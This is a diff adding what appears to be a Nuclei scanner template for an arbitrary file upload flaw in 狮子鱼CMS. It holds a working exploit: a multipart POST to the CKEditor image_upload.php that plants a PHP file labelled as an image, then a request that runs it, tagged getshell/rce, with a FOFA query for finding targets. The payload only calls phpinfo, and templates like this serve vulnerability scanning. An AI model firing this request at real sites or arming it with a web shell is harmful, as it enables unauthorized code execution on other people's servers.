@@ -1,0 +1,57 @@
+id: shiziyuCMS-ck-AnyFileUpload
+info:
+  name: 狮子鱼CMS image_upload.php 任意文件上传
+  author: wjlin0
+  severity: critical
+  description: |
+    狮子鱼CMS使用CK编辑器，存在图片上传的绕过，造成 image_upload.php 任意文件上传
+    上传路径为：http://xxxx.xxxx/Common/image/uploads/163*****365.php
+  reference:
+    - http://wiki.peiqi.tech/wiki/cms/%E7%8B%AE%E5%AD%90%E9%B1%BCCMS/%E7%8B%AE%E5%AD%90%E9%B1%BCCMS%20image_upload.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html
+  metadata:
+    fofa-query: '"/seller.php?s=/Public/login"'
+  tags: getshell,rce,phpinfo
+
+http:
+  - raw:
+      - |-
+        POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
+        Content-Length: 243
+
+        ------WebKitFormBoundary8UaANmWAgM4BqBSs
+        Content-Disposition: form-data; name="files"; filename="test.php"
+        Content-Type: image/gif
+
+        <?php echo md5('7e4d25306ccddfsdfsc1862427f0a09');phpinfo();?>
+        ------WebKitFormBoundary8UaANmWAgM4BqBSs--
+      - |
+        GET /Common/{{rce_url}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_1
+        words:
+          - image/uploads/
+          - imgurl
+          - result
+        condition: and
+      - type: word
+        part: body_2
+        words:
+          - 85a6abbfc4aa5ffb1759037c16c1988a
+          - PHP Version
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: rce_url
+        part: body
+        regex:
+          - (image/uploads/[0-9]{13}\.php)
+        internal: true
+        group: 1
+# digest: 4a0a004730450220056292db288ce0dbe2ad70ed9071e7c08a6ddd826a5d6bb896064214003430c1022100a8ffe813ed5d380d19e91d6062bf9b3e3f405c6a752d4530b6c5d5003ce63733:9d8cf424f0e932381bf27cf1e926b867
